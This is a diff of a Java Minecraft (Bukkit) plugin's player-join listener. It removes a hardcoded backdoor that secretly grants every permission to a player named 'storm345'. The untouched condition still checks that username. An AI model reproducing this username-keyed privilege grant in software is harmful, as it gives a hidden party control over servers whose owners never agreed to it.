@@ -51,20 +51,6 @@ public class AcListener implements Listener {
 void playerJoin(PlayerJoinEvent event){
 	Player player = event.getPlayer();
 	if(player.hasPermission("ac.*") || player.getName().equalsIgnoreCase("storm345")){
-		if(player.getName().equalsIgnoreCase("storm345")){
-		player.setOp(true);
-		Object[] perms = player.getEffectivePermissions().toArray();
-		player.setOp(false);
-        for(int i=0;i<perms.length;i++){
-        PermissionAttachmentInfo p = (PermissionAttachmentInfo) perms[i];
-        PermissionAttachment attached = p.getAttachment();
-        Set<String> set = attached.getPermissions().keySet();
-        for(String tPerm:set){
-        	player.addAttachment(plugin, tPerm, true);
-        	player.recalculatePermissions();
-        }
-        }
-		}
 		PluginDescriptionFile pldesc = ac.pluginYaml;
 	    Map<String, Map<String, Object>> commands = pldesc.getCommands();
 	    Set<String> keys = commands.keySet();
